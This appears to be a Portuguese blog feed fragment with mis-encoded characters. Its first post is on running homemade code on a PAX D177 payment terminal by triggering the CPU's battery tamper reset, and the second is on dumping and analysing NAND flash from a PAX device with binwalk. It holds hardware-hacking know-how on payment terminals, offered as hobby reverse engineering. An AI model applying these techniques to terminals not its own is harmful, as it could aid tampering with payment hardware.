<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/217023812ae3d8552e72a67306105efa_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/0c7f3862853471f760b69c71098168a4_MD5.jpeg" alt="" /></p>

<p>Basicamente a placa, n√£o tinha a bateria-moeda onde deveria ter, s√≥ um capacitor pra emular (o XH311H no esquem√°tico, era basicamente um conector nao populado), e o que o pino de reset fazia na verdade era <strong>colocar essa bateria em curto</strong> fazendo ela marcar 0V. E adivinha s√≥? O datasheet estava me falando o tempo todo, mas minha falta de experi√™ncia lendo chines s√≥ passou batido üòÜ</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/7a75d13b7c4758f46f7c29717f7907cd_MD5.jpeg" alt="" />
Pra aqueles (como eu) que est√£o enferrujados no Chines, o texto acima basicamente diz: Alimenta√ß√£o da bateria, precisa ser energizado caso contrario o chip n√£o funciona.</p>

<p>Ent√£o eu investiguei um pouco mais a bootrom (ainda vou postar detalhes da engenharia reversa da bootrom desse chip) e notei que o que acontece √©: Quando o VBAT33 cai para baixo de 2.3V, ele aciona um tamper na CPU. O jeito que a CPU lida com esse tamper, √© basicamente se resetar, o que apaga a NVRAM e seta alguns registradores que podem ser lidos pela bootrom ou pela aplica√ß√£o. Ent√£o basicamente, o bot√£o de reset do AIR105 √© um bot√£o de tamper üòÜ</p>

<p>Olhando na PCB da D177, n√£o h√° nenhum testpad especifico para atuar como reset, mas geralmente para evitar que a bateria seja usada quando existe energia externa, colocam um diodo em s√©rie com ela a maneira de isolar ela. Posso soldar um fio nesse diodo para usar como reset. Seguindo os tra√ßos na PCB, achei um diodo na borda da placa.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/ea6eb39aabf1f914c71bda9f6eb79907_MD5.jpeg" alt="" /></p>

<p>Ent√£o apenas soldei um fio, abri meu <a href="https://github.com/racerxdl/air105-uploader/">air105-uploader</a> e manualmente setei ele pro GND. E <strong>PROFIT</strong>:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/a4da09ed6fa71e3bd9b38a0097594756_MD5.jpeg" alt="" /></p>

<p>Agora eu consigo rodar c√≥digo na m√°quina!!!</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3247c212e1baa37421f763ede653c022_MD5.jpeg" alt="" /></p>

<h2 id="construindo-c√≥digo-para-isso">Construindo c√≥digo para isso</h2>

<p>N√£o vou entrar em muitos detalhes aqui (j√° que este artigo j√° est√° ficando maior do que eu esperava), mas o resumo √©: o LuatOS fornece uma maneira de construir coisas e tem um ‚Äúboilerplate‚Äù para inicializar todas as coisas do lua. O pr√≥prio CPU √© um ARM Cortex, ent√£o √© facilmente constru√≠vel pelo GCC, apenas requerendo um script de liga√ß√£o personalizado para juntar tudo no lugar certo.</p>

<p>Basicamente, reutilizei quase tudo que fiz para o AIR105, apenas mudei o script de liga√ß√£o para estar ciente de que o MH1903 na verdade tem 1MB de RAM em vez de 640KB. Para torn√°-lo mais f√°cil de usar, criei algumas libs para <a href="https://platformio.org/">platform.io</a> que voc√™ pode usar diretamente.</p>

<p>Se voc√™ quiser experimentar, basta instal√°-lo atrav√©s do pip.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install</span> <span class="nt">-U</span> platformio
</code></pre></div></div>

<p>Em seguida, voc√™ pode criar um novo projeto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>my-project <span class="o">&amp;&amp;</span> <span class="nb">cd </span>my-project
pio init
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The following files/directories have been created in /tmp/m
include - Put project header files here
lib - Put project specific (private) libraries here
src - Put project source files here
platformio.ini - Project Configuration File
Project has been successfully initialized!
</code></pre></div></div>

<p>Depois disso, voc√™ pode simplesmente editar o <code class="language-plaintext highlighter-rouge">platformio.ini</code> para mape√°-lo para usar a plataforma air105:</p>

<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[env:air105]</span>
<span class="py">platform</span> <span class="p">=</span> <span class="err">https://github.com/racerxdl/platformio-air</span><span class="mi">105</span>
<span class="py">board</span> <span class="p">=</span> <span class="err">mh</span><span class="mi">1903</span>
<span class="py">framework</span> <span class="p">=</span> <span class="err">baremetal</span>
<span class="py">;monitor_port</span> <span class="p">=</span> <span class="err">SERIAL_PORT</span>
<span class="py">;monitor_speed</span> <span class="p">=</span> <span class="mi">115200</span>
<span class="py">monitor_rts</span> <span class="p">=</span> <span class="mi">0</span> <span class="err">;</span> <span class="err">AIR</span><span class="mi">105</span> <span class="err">board</span> <span class="err">has</span> <span class="err">inverted</span> <span class="err">RTS</span>
<span class="py">build_flags</span> <span class="p">=</span> <span class="err">-g</span> <span class="err">-ggdb</span>
</code></pre></div></div>

<p>Voc√™ pode alterar o par√¢metro <code class="language-plaintext highlighter-rouge">board</code> entre <code class="language-plaintext highlighter-rouge">mh1903</code> e <code class="language-plaintext highlighter-rouge">air105</code>, dependendo do que voc√™ est√° direcionando. O MH1903 √© a variante de 1MB, portanto, o c√≥digo travar√° no AIR105 devido √† stack estar posicionada no final do espa√ßo RAM.</p>

<p>E para executar:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pio run <span class="nt">-t</span> upload
</code></pre></div></div>

<p>Isso deve compilar e carregar (usando o air105-uploader) diretamente. Tamb√©m ir√° baixar qualquer ferramenta e bibliotecas necess√°rias para isso. Voc√™ tamb√©m pode adicionar <code class="language-plaintext highlighter-rouge">-t monitor</code> para abrir um console serial e ver o retorno da m√°quina.</p>

<p>O c√≥digo-fonte para o framework e a plataforma nos links do platform.io est√£o no final deste artigo.</p>

<h2 id="magic-stuff">MAGIC STUFF</h2>

<p>Ent√£o, este artigo est√° ficando enorme e sinto que muitos detalhes ser√£o mal escritos se eu continuar colocando conte√∫do aqui. Afinal, este √© um projeto de pesquisa de mais de 4 anos. Portanto, eventualmente escreverei mais dois artigos sobre como mapeei algumas coisas m√°gicas.</p>

<p>Quando digo coisas m√°gicas, as pr√≥ximas se√ß√µes deste artigo v√£o assumir que sabemos como o LCD est√° conectado √† CPU, o que inicialmente supus que estava na mesma porta que a mem√≥ria flash que vimos na PCB. Resumindo, est√°, mas n√£o o Chip Select, nem o controle da backlight do LCD, e esses n√£o foram triviais de encontrar, j√° que o pinout do LCD n√£o √© padr√£o e eu n√£o consegui encontrar nenhum datasheet dele.</p>

<p>Eu emulei o firmware para descobrir algumas coisas (outras coisas foram apenas observando se√ß√µes descompiladas) e a coisa m√°gica que descobri √© que os pinos que controlam o LCD est√£o mapeados em um GPIO que <strong>n√£o existe</strong> de acordo com o datasheet üòÉ (Spoiler, existem <strong>dois</strong> GPIOs n√£o documentados e algumas outras coisas)</p>

<p>Por agora, vamos apenas fingir que escrevi um bom artigo sobre como fiz isso. Prometo que escreverei um novo com detalhes sobre a engenharia reversa e os detalhes de como fiz um emulador para isso (que poderia at√© mostrar as imagens do LCD) üëÄ</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/e129a7f1554e79536be3ca8d71fe03d9_MD5.jpeg" alt="" /></p>

<h2 id="fazendo-o-crasharalho">Fazendo o ‚Äúcrasharalho‚Äù</h2>

<p>O ‚Äúcrasharalho‚Äù √© um sticker que uso muito no Discord e no Telegram. No artigo ingl√™s eu explico o que √© o crasharalho, mas acho que em portugu√™s, √© auto explicativo hehe.</p>

<p>Fazer foi f√°cil, apenas criei uma imagem 160x128 no GIMP e colei o sticker l√°.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/67e6e21e4aca4b6c3ceeb47bf2b57530_MD5.jpeg" alt="" /></p>

<p>O Gimp tamb√©m √© bom porque pode exportar diretamente para um cabe√ßalho C, meio que comprimido com uma macro para realmente obter os valores de pixel R,G,B. Ent√£o foi bem f√°cil convert√™-lo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* GIMP header image file format (RGB): include/crasharalho.h */</span>

<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">width</span> <span class="o">=</span> <span class="mi">160</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">height</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>

<span class="cm">/* Call this macro repeatedly. After each use, the pixel data can be extracted */</span>

<span class="cp">#define HEADER_PIXEL(data,pixel) {\
pixel[0] = (((data[0] - 33) &lt;&lt; 2) | ((data[1] - 33) &gt;&gt; 4)); \
pixel[1] = ((((data[1] - 33) &amp; 0xF) &lt;&lt; 4) | ((data[2] - 33) &gt;&gt; 2)); \
pixel[2] = ((((data[2] - 33) &amp; 0x3) &lt;&lt; 6) | ((data[3] - 33))); \
data += 4; \
}
</span>
<span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">header_data</span> <span class="o">=</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>
<span class="p">(...)</span>
</code></pre></div></div>

<p>O LCD ST7735 que a m√°quina usa tem v√°rios modos de pixel. Decidi usar RGB565, pois seria exatamente 16 bits de largura (o que d√° dois bytes sobre SPI) e f√°cil de converter. Fui pregui√ßoso, ent√£o usei uma LLM local para gerar uma macro para convert√™-lo, o que funcionou muito bem (eu n√£o lembrava como converter os espa√ßos, n√£o tinha certeza se era apenas cortar bits ou realmente uma LUT).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define RGB888_TO_RGB565(r, g, b) ( \
(((r) &amp; 0xF8) &lt;&lt; 8) | </span><span class="cm">/* 5 bits of red, shifted to bits 15-11 */</span><span class="cp"> \
(((g) &amp; 0xFC) &lt;&lt; 3) | </span><span class="cm">/* 6 bits of green, shifted to bits 10-5 */</span><span class="cp"> \
(((b) &amp; 0xF8) &gt;&gt; 3) </span><span class="cm">/* 5 bits of blue, shifted to bits 4-0 */</span><span class="cp"> \
)
</span></code></pre></div></div>

<p>A LLM gerou um pequeno corte, e funcionou bem. Ent√£o, deixei como estava. Depois, pude simplesmente envi√°-lo diretamente no c√≥digo:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">{</span>
        <span class="c1">// 0x2C RAMWR</span>
        <span class="n">SendCMD</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">);</span>                <span class="c1">// RAMWR</span>
        <span class="n">P15_ON</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
        <span class="c1">// Fill the screen with white color // 16 bit mode</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">160</span> <span class="o">*</span> <span class="mi">128</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HEADER_PIXEL</span><span class="p">(</span><span class="n">header_data</span><span class="p">,</span> <span class="n">rgb</span><span class="p">);</span>
            <span class="kt">uint16_t</span> <span class="n">color</span> <span class="o">=</span> <span class="n">RGB888_TO_RGB565</span><span class="p">(</span><span class="n">rgb</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span><span class="n">color</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// Send high byte</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span> <span class="c1">// Send low byte</span>
        <span class="p">}</span>
        <span class="n">P15_OFF</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>E testei no meu emulador:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/947b71be153e6405b62909b62e93385d_MD5.jpeg" alt="" /></p>

<h2 id="resultado">Resultado</h2>

<p><img src="/assets/Running code in a Credit Card Payment Machine/23c966b8036e41fe19f78b38bfa8bf73_MD5.jpeg" alt="" /></p>

<h2 id="pr√≥ximos-passos">Pr√≥ximos passos</h2>

<p>Rodar doom, √© claro üòÉ - Eu planejava fazer este artigo apenas ap√≥s o doom, mas descobri que 1MB de RAM √© meio baixo para o doom padr√£o. Vi que h√° uma vers√£o RP2040 do doom que funciona muito bem, ent√£o provavelmente vou portar para esse n√∫cleo.</p>

<p>Ainda quero fazer engenharia reversa de tudo que puder desses SoCs, j√° que s√£o bastante poderosos e t√™m bons aceleradores que podem ser usados para outras coisas seguras. Tamb√©m consegui extrair as ROMs de boot do MH1903S e do MH1903, que t√™m seus pr√≥prios aspectos interessantes. Quase terminei de fazer a engenharia reversa da ROM de boot do MH1903S e pretendo fazer um artigo sobre isso em breve. Parece que existem v√°rias vers√µes de ROMs de boot por a√≠ (elas basicamente fazem a mesma coisa, mas t√™m diferentes revis√µes e builds). Ent√£o, se voc√™ encontrar algum dispositivo MH190x que voc√™ possa fazer JTAG ou que n√£o tenha a assinatura de boot habilitada, me avise. Vamos fazer um arquivo de ROMs de boot üòÉ</p>

<h2 id="notas">Notas</h2>

<ol>
  <li>Houve um pouco de pesquisa sobre os c√≥digos da PAX e PagBank para descobrir como eles interagem com o hardware. Nenhuma falha de seguran√ßa foi explorada e n√£o h√° nada que eles possam fazer sobre a troca de CPU.</li>
  <li>N√£o h√° nada espec√≠fico para o PagBank nesse caso. Qualquer D177 deve funcionar bem. O trabalho aqui <strong>n√£o √© devido a uma falha de seguran√ßa</strong>.</li>
  <li>Megahunt faz MUITO ‚ÄúSilicon OEM‚Äù (o AIR105 mencionado aqui √© apenas um deles). Decaps devem apontar.</li>
  <li>Al√©m da boot rom, n√£o compartilho bin√°rios que extra√≠ de m√°quinas. N√£o fiz engenharia reversa o suficiente para saber quais informa√ß√µes eles armazenam, e eles podem conter coisas que devem ser privadas. Portanto, por favor, n√£o pe√ßa, voc√™ pode extra√≠-lo voc√™ mesmo. √â bem f√°cil.</li>
  <li>Os artigos seguintes mostrar√£o como fiz engenharia reversa dos boot loaders, formato de imagem pax e descobri como os pinos do LCD foram mapeados.</li>
</ol>

<h3 id="links">Links</h3>

<ul>
  <li><a href="https://github.com/racerxdl/platformio-air105">https://github.com/racerxdl/platformio-air105</a> - PIO Platform for AIR105/MH1903</li>
  <li><a href="https://github.com/racerxdl/framework-megahunt">https://github.com/racerxdl/framework-megahunt</a> - PIO Framework for Megahunt devices</li>
  <li><a href="https://github.com/racerxdl/air105-uploader">https://github.com/racerxdl/air105-uploader</a> - Python script to upload using the boot rom</li>
  <li><a href="https://archive.org/details/mh-1903-s-v-1.5">https://archive.org/details/mh-1903-s-v-1.5</a> - Some usefull MH1903 datasheets</li>
  <li><a href="https://github.com/racerxdl/d177-crasharalho">https://github.com/racerxdl/d177-crasharalho</a> - Crasharalho Source Code</li>
  <li><a href="https://github.com/racerxdl/megahunt-bootroms">https://github.com/racerxdl/megahunt-bootroms</a> - Megahunt Bootroms</li>
  <li><a href="https://github.com/racerxdl/mhdumper">https://github.com/racerxdl/mhdumper</a> - Megahunt ROM Dumper Tool</li>
</ul>

<h3 id="timeline">Timeline</h3>

<ul>
  <li><strong>01/04/2025</strong> - Voltei aos trabalhos de engenharia reversa e mapeamento</li>
  <li><strong>17/06/2025</strong> - Consegui rodar o primeiro c√≥digo (crasharalho)</li>
  <li><strong>22/06/2025</strong> - Terminei o artigo, mandei para revis√£o (t√©cnica)</li>
  <li><strong>27/08/2025</strong> - Enviei o artigo para pag para revis√£o</li>
  <li><strong>28/08/2025</strong> - Aprovado pela pag para publica√ß√£o</li>
  <li><strong>31/08/2025</strong> - Mais reviews, tradu√ß√£o, etc‚Ä¶</li>
  <li><strong>05/09/2025</strong> - Publicado</li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Payment Machines" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="D177" /><category term="D188" /><category term="Minizinha" /><category term="Moderninha" /><category term="Smart" /><category term="Sunmi" /><category term="TecToy" /><category term="Transire" /><category term="Megahunt" /><category term="MH1903" /><category term="Air105" /><category term="LuatOS" /><summary type="html"><![CDATA[Disclaimer]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" /><media:content medium="image" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">An√°lise e Decodifica√ß√£o de Mem√≥ria Flash NAND - Revelando a Dispers√£o ECC em Dispositivos Desconhecidos</title><link href="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash" rel="alternate" type="text/html" title="An√°lise e Decodifica√ß√£o de Mem√≥ria Flash NAND - Revelando a Dispers√£o ECC em Dispositivos Desconhecidos" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash"><![CDATA[<h2 id="explorando-memorias-nand">Explorando memorias NAND</h2>

<p>Quando em posse de um dispositivo a qual se deseja conhecer sobre, nem sempre √© trivial o acesso ao conte√∫do da mem√≥ria <em>flash</em>. Devido a natureza das mem√≥rias NAND, √© aplicado para todo conte√∫do um algor√≠timo de corre√ß√£o de erros que pode causar uma ofusca√ß√£o n√£o  intencional do conte√∫do. Alguns fabricantes de processadores que controlam diretamente mem√≥rias do tipo NAND ou programadores de <em>software</em> ‚Äúprotegido‚Äù optam por customizar o jeito que estes algor√≠timos funcionam.</p>

<p>Neste artigo veremos como a estrutura b√°sica de uma mem√≥ria <em>flash</em>, por que a corre√ß√£o de erro existe e como identificar a dispers√£o do algor√≠timo de corre√ß√£o de erro usado.</p>

<h1 id="mem√≥rias-flash">Mem√≥rias Flash</h1>

<p>As mem√≥rias flash t√™m se destacado como a espinha dorsal do armazenamento digital na era contempor√¢nea. Presentes em dispositivos t√£o variados quanto SSDs, pen drives e cart√µes SD, estas mem√≥rias trazem uma combina√ß√£o irresist√≠vel de rapidez, durabilidade e capacidade de reten√ß√£o de dados mesmo na aus√™ncia de energia.</p>

<p>Historicamente, antes da ascens√£o das mem√≥rias flash, os principais dispositivos de armazenamento eram baseados em m√≠dias magn√©ticas, como discos r√≠gidos e disquetes, ou em mem√≥rias do tipo <em>EPROM</em> (Erasable Programmable Read Only Memory). Enquanto as m√≠dias magn√©ticas possu√≠am partes m√≥veis e eram mais propensas a falhas f√≠sicas, as EPROMs necessitavam de um processo de apagamento espec√≠fico, tornando a regrava√ß√£o de dados um processo mais lento e menos eficiente.</p>

<p>Dentro da categoria de mem√≥rias flash, encontramos diferentes varia√ß√µes, com as vers√µes NOR e NAND sendo as mais predominantes. Neste artigo, focaremos nas mem√≥rias flash do tipo NAND, reconhecidas por sua alta densidade de armazenamento e amplamente utilizadas em dispositivos de armazenamento cotidianos, garantindo velocidade e confiabilidade na leitura e grava√ß√£o de dados.</p>

<h2 id="anatomia-de-uma-c√©lula-nand">Anatomia de uma C√©lula NAND</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell.svg" alt="C√©lula de mem√≥ria Flash" />
<em>Diagrama detalhado de uma c√©lula NAND</em></p>

<p>No cora√ß√£o da tecnologia de mem√≥ria flash, encontra-se a intricada arquitetura de uma c√©lula NAND. A ilustra√ß√£o acima delineia os componentes fundamentais da c√©lula: o Control Gate, o Floating Gate, camadas isolantes de √≥xido, juntamente com os terminais N-Type Source e N-Type Drain, todos constru√≠dos sobre um substrato do tipo-P.
Os bits s√£o armazenados na mem√≥ria flash retendo el√©trons no Floating Gate.</p>

<p>Durante a opera√ß√£o de grava√ß√£o, uma tens√£o √© imposta sobre o Control Gate, induzindo el√©trons a atravessarem a barreira de √≥xido e se alojarem no Floating Gate. Assim que os el√©trons alcan√ßam o Floating Gate, eles permanecem l√°, denotando um estado ‚Äúgravado‚Äù.
<img src="/assets/posts/analise-e-decodificacao-flash/flash-write.svg" alt="Processo de grava√ß√£o em mem√≥ria flash" /></p>

<p>Para ler a informa√ß√£o armazenada, uma tens√£o √© aplicada ao Control Gate. Se houver el√©trons no Floating Gate, eles criar√£o uma for√ßa de repuls√£o, bloqueando a passagem de el√©trons do Source para o Drain. Este estado √© reconhecido como um bit ‚Äú0‚Äù. Contudo, se o Floating Gate estiver desocupado, a corrente el√©trica circular√° sem impedimentos, correspondendo a um bit ‚Äú1‚Äù.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" alt="Estado programado de uma c√©lula NAND" />
<em>C√©lula NAND no estado ‚Äúgravado‚Äù</em></p>

<p>Finalmente, a configura√ß√£o el√©tronica ‚Äî seja sua aus√™ncia ou presen√ßa ‚Äî determina se a c√©lula est√° representando um bit ‚Äú0‚Äù ou ‚Äú1‚Äù. A imagem subsequente mostra uma c√©lula no estado ‚Äúapagado‚Äù, caracterizado pela livre circula√ß√£o de el√©trons entre os terminais.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-erased.svg" alt="Estado apagado de uma c√©lula NAND" />
<em>C√©lula NAND no estado ‚Äúapagado‚Äù</em></p>

<h2 id="arquitetura-da-mem√≥ria-nand">Arquitetura da Mem√≥ria NAND</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/nand-block.svg" alt="Estrutura de Bloco NAND Block" />
<em>Diagrama representando a organiza√ß√£o de um bloco NAND</em></p>

<p>A mem√≥ria NAND √© meticulosamente organizada em uma estrutura hier√°rquica. Come√ßando pela menor unidade, temos a c√©lula. Estas c√©lulas s√£o, por sua vez, agrupadas para formar p√°ginas. Avan√ßando na hierarquia, m√∫ltiplas p√°ginas s√£o ent√£o consolidadas para constituir um bloco, como ilustrado no diagrama acima.</p>

<p>Essa disposi√ß√£o estrutural n√£o √© apenas por organiza√ß√£o. Ela desempenha um papel vital na efici√™ncia das opera√ß√µes da mem√≥ria flash. Um detalhe importante a se considerar √© que, em diversos dispositivos baseados em tecnologia flash, a opera√ß√£o de apagamento √© executada em n√≠vel de bloco, e n√£o em c√©lulas ou p√°ginas individuais.</p>

<p>A imagem exemplifica uma mem√≥ria NAND que cont√©m p√°ginas de 2048 bytes de dados acrescidos de 64 bytes destinados √† corre√ß√£o de erro, totalizando 2112 bytes por p√°gina. Estas p√°ginas est√£o agrupadas em blocos que abrigam 64 p√°ginas cada, resultando em 128K bytes de dados e 4K bytes para corre√ß√£o.</p>

<p>Os bytes adicionais em cada p√°gina n√£o s√£o meros complementos. Eles s√£o intr√≠nsecos √† integridade da mem√≥ria. Embora sejam armazenados da mesma forma que qualquer outro byte, muitas vezes s√£o alocados para fun√ß√µes espec√≠ficas, como paridade em algoritmos de Corre√ß√£o de Erros (ECC). Essa corre√ß√£o √© indispens√°vel, pois, durante a fabrica√ß√£o ou mesmo ao longo do uso, √© poss√≠vel que algumas c√©lulas da mem√≥ria NAND apresentem defeitos ou se desgastem, comprometendo a precis√£o dos dados armazenados. O ECC, portanto, atua como uma camada protetora, assegurando a confiabilidade dos dados mesmo diante de imperfei√ß√µes na mem√≥ria.</p>

<h2 id="lendo-mem√≥rias-flash">Lendo mem√≥rias Flash</h2>

<p>Ao lidar com leitura e grava√ß√£o em mem√≥rias Flash, existe uma variedade de dispositivos dispon√≠veis. Para mem√≥rias flash com encapsulamentos menos convencionais, como o BGA (Ball Grid Array), frequentemente recorro ao programador RT809H, utilizando um adaptador espec√≠fico para tal encapsulamento. A mem√≥ria flash em quest√£o foi originalmente extra√≠da de um equipamento da PAX, um modelo dispon√≠vel no Mercado Livre sob a descri√ß√£o ‚Äúm√°quina de cart√£o‚Äù. Vale destacar que o tipo de encapsulamento dessa mem√≥ria flash √© BGA63, indicando um arranjo de 63 pinos no formato ball-grid-array.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash_memory.jpg" alt="Mem√≥ria Flash no programador universal RT809H pronto para leitura" /><em>Mem√≥ria Flash no programador universal RT809H pronto para leitura</em></p>

<p>Ap√≥s a extra√ß√£o dos dados da mem√≥ria flash, um passo fundamental √© a utiliza√ß√£o da ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code>. Este comando tem a fun√ß√£o de vasculhar e listar poss√≠veis assinaturas de arquivos conhecidos contidos no dump da mem√≥ria, permitindo uma an√°lise preliminar de seu conte√∫do. Essa etapa √© crucial para discernir se enfrentaremos desafios ao tentar decifrar os dados armazenados, como no caso de estarem criptografados.</p>

<p>√â importante ressaltar que a imagem produzida pelo programador RT809H retrata o conte√∫do da mem√≥ria flash em seu estado mais puro, sem qualquer filtragem. Isso significa que os bits de paridade do ECC (Error-Correcting Code) est√£o inclusos. Esta caracter√≠stica pode introduzir nuances durante a an√°lise, pois nem todas as assinaturas ser√£o reconhecidas de maneira acurada, principalmente se considerarmos arquivos que podem iniciar no final de uma p√°gina de mem√≥ria.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
<span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header CRC: 0x538F3DE9, created: 2021-05-27 08:14:51, image size: 3696472 bytes, Data Address: 0x80800000, Entry Point: 0x80800000, data CRC: 0xA22F74A5, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linux-2.7.93.9707R"</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
20815882      0x13DA00A       uImage header, header size: 64 bytes, header CRC: 0xF95F6882, created: 2021-05-27 08:20:25, image size: 8185419 bytes, Data Address: 0x83800000, Entry Point: 0x83800000, data CRC: 0xE5674944, OS: Linux, CPU: ARM, image <span class="nb">type</span>: RAMDisk Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"RAMDISK-2.7.93.9707R"</span>
<span class="o">(</span>...<span class="o">)</span>
20815946      0x13DA04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:20:23
33792010      0x203A00A       uImage header, header size: 64 bytes, header CRC: 0x588DFFBC, created: 2021-05-27 08:19:13, image size: 6412038 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x32979F1E, OS: Linux, CPU: ARM, image <span class="nb">type</span>: Firmware Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"BASE-2.7.93.9707R"</span>
33792074      0x203A04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:19:11
46768138      0x2C9A00A       UBI erase count header, version: 1, EC: 0x3, VID header offset: 0x800, data offset: 0x1000
</code></pre></div></div>

<p>A avalia√ß√£o da entropia √© uma t√©cnica eficaz para detectar conte√∫do criptografado ou compactado em uma mem√≥ria. Quando falamos de entropia em dados, estamos nos referindo √† quantidade de informa√ß√£o ou imprevisibilidade contida nesses dados. A ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code> oferece um modo espec√≠fico para medir essa entropia.</p>

<p>Arquivos que est√£o compactados ou criptografados tendem a exibir um padr√£o de dados aparentemente aleat√≥rio, resultando em uma medida de entropia que se aproxima de 1. Em contraste, arquivos ‚Äúplain-text‚Äù ou dados n√£o codificados geralmente possuem entropia significativamente mais baixa, tendendo para valores pr√≥ximos de 0, pois seu conte√∫do √© mais previs√≠vel.</p>

<p>Para explorar essa funcionalidade no <code class="language-plaintext highlighter-rouge">binwalk</code>, utiliza-se a op√ß√£o <code class="language-plaintext highlighter-rouge">-E</code>, que ativa o modo de medi√ß√£o de entropia. Ao execut√°-la, voc√™ receber√° um gr√°fico que visualmente representar√° as varia√ß√µes de entropia ao longo do arquivo, facilitando a identifica√ß√£o de segmentos criptografados ou compactados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-E</span> F59L1G81MA@BGA63_1111.BIN
DECIMAL       HEXADECIMAL     ENTROPY
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             Falling entropy edge <span class="o">(</span>0.027839<span class="o">)</span>
